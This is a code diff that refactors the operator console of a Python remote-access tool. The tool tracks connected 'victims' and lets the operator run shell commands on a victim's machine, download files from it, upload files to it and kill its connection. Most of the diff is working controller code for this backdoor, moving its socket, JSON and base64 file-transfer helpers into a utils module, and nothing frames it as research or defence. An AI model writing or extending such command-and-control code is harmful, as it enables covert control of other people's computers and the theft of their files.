@@ -1,11 +1,9 @@
 import socket
 import threading
-import json
 import sys
-import subprocess
 import time
 import os
-import base64
+import utils
 
 
 class InteractVictim():
@@ -22,8 +20,9 @@ class InteractVictim():
             "help\t": "Print this help menu.",
             "back\t": "Return to the console(background to current connection).",
             "download": "Download a file.",
-            "upload": "Upload a file to server.",
-            "    \t": "All default commands of the OS."
+            "upload\t": "Upload a file to server.",
+            "!cmd\t": "Run command in the host.",
+            "    \t": "All default commands of the victim OS."
         }
 
         print("[+] Help menu.\n")
@@ -32,89 +31,54 @@ class InteractVictim():
         for cmd in victim_cmd:
             print(f"{cmd}\t{victim_cmd.get(cmd)}")
 
-    def _send(self, data:str):
-        """Sends data as json to conn."""
-
-        self.conn.sendall(json.dumps(data).encode())
-
-    def _does_file_exists(self, file:str) -> bool:
-        """Check if a file exists or not. Return True or False."""
-
-        return os.path.exists(os.path.expanduser(file))
-
-    def _write_file(self, name, data):
-        """Download file from the victim."""
-
-        try:
-            with open(name, "wb") as file:
-                file.write(base64.b64decode(data))
-        
-        except FileExistsError:
-            print(f"[!] File named {name} exists.")
-
-    def _send_file(self, file):
-        """Send file to the server"""
-        
-        with open(file, "rb") as f:
-
-            self._send(base64.b64encode(f.read()).decode())
-
-        return
-
-    def _receive(self):
-        """Return data received from the conn."""
-        json_data = ""
-
-        while True:
-            try:
-                chunk = self.conn.recv(1024)
-
-                if not chunk:
-                    return None
-                
-                json_data += chunk.decode('utf-8')
-                return json.loads(json_data)
-            
-            except ValueError:
-                continue
-            except (ConnectionResetError, OSError):
-                # Socket was closed/reset.
-                return None
-
     def victim_console(self) -> None:
     
         while self.conn:
         
             command = input(f"{self.id}-> ").strip(' ')
     
-            if command in ["help", "back", ]:
+            if command in ["help", "back"]:
 
                 if "help" == command:
                     self._victim_help()
                 else:
                     break
 
+            elif "!" == command[:1]:
+                output = utils._exec_command(command[1:])
+
+                if output:
+                    print(output)
+
             elif "download" == command[:8]:
 
-                self._send(command)
+                utils._send(self.conn, command)
 
                 file_name = command[9:]
-                file_data = self._receive()
+                print(f"[+] Downloading {file_name}...")
+                file_data = utils._receive(self.conn)
 
-                self._write_file(file_name, file_data)
+                utils._write_file(file_name, file_data)
 
             elif "upload" == command[:6]:
-                self._send(command)
 
-                file = os.path.abspath(command[6:].strip(' '))
+                file_name = command[6:].strip(' ')
+                file = os.path.abspath(file_name)
 
-                if self._does_file_exists(file):
-                    self._upload_file(file=file)
+                if utils._does_file_exists(file):
+
+                    print(f"[+] Uploading {file_name}...")
+
+                    utils._send(self.conn, command)
+                    utils._send_file(self.conn, file=file)
+                else:
+                    print(f"[!] File, {file_name} does not exists.")
+
 
             else:
-                self._send(command)
+                utils._send(self.conn, command)
         
-                receive_data = self._receive()
+                receive_data = utils._receive(self.conn)
             
                 if not receive_data:
                     continue
@@ -132,14 +96,6 @@ class Server():
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.victims_dict = {} # Stores conn of the victim(s)
         self.victim_id = 0
-        self.console_cmd = {
-            "help\t": "Print this help menu.",
-            "exit\t": "Exit the program",
-            "kill\t": "Kill a connection from ID.",
-            "jobs\t": "To see connected victims.",
-            "interact": "Interact with one of the victim.",
-            "!cmd\t" : "Run terminal command in the host.",
-        }
 
     def _accept_connection(self) -> None:
         """Adds conn, addr to connected_client dict."""
@@ -164,7 +120,7 @@ class Server():
         try:
             print(f"[+] Closing connection with {conn}")
 
-            self.victim_console._send(conn, "kill yourself")
+            utils._send(conn, "kill yourself")
             time.sleep(0.5)
             conn.close()
 
@@ -175,33 +131,23 @@ class Server():
             print(f"[!] Error occurred: {e}")
             return
 
-    def _run_on_host(self, command) -> str:
-        """Command to run in the Server through the console."""
-
-        try:
-
-            if command[:2] == "cd":
-                try:
-                    os.chdir(command[3:])
-                except OSError:
-                    return f"Directory {command[3:]} does not exits!"
-                
-            else:
-                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-                result = process.stdout.read() + process.stderr.read()
-                return result
-            
-        except Exception as e:
-           return e
-
     def _console_help(self):
         """Displays available command that can be run on the console"""
+
+        console_cmd = {
+            "help\t": "Print this help menu.",
+            "exit\t": "Exit the program(doesn't kill existance connection).",
+            "kill\t": "Kill a connection from ID.",
+            "jobs\t": "To see connected victims.",
+            "interact": "Interact with one of the victim.",
+            "!cmd\t" : "Run terminal command in the host.",
+        }
 
         print("[+] Help menu.")
         print("Command\t\tDescription")
 
-        for cmd in self.console_cmd:
-            print(f"{cmd}\t{self.console_cmd.get(cmd)}")
+        for cmd in console_cmd:
+            print(f"{cmd}\t{console_cmd.get(cmd)}")
 
     def _victim_exists(self, id:int) -> bool:
         """Takes victim id to check if it exists or not. Returns True if victim exists, else False."""
@@ -212,6 +158,8 @@ class Server():
         return True
 
     def _list_victims(self):
+        """Lists all available connection."""
+
         print(f"[+] Total {self.victim_id} victims...")
         print("ID\tVictim")
 
@@ -233,7 +181,7 @@ class Server():
                     self._console_help()
 
                 elif cmd.startswith("!"):
-                    cmd_output = self._run_on_host(cmd[1:])
+                    cmd_output = utils._exec_command(cmd[1:])
 
                     if cmd_output:
                         print(cmd_output)
@@ -246,8 +194,8 @@ class Server():
                     id = int(cmd[4:].strip(' '))
 
                     if not self._victim_exists(id):
-                        print("[-] Failed to kill victim.")
-                        print(f"[!] No client associated with that ID, {id}.")
+                        print("[!] Failed to kill victim.")
+                        print(f"[!] No victim associated with ID, {id}.")
                         continue
 
                     self._close_connection(id)
@@ -259,9 +207,9 @@ class Server():
                     id = int(cmd[8:])
 
                     if not self._victim_exists(id):
-                        print("[-] Connot interact with victim {id}.")
-                        print(f"[-] Victim with ID {id} does not exists.\n")
-                        return
+                        print("[!] Failed interact with victim.")
+                        print(f"[!] Victim with ID {id} does not exists.\n")
+                        continue
                     
                     victim_console = InteractVictim(id, self.victims_dict.get(id))
                     victim_console.victim_console()
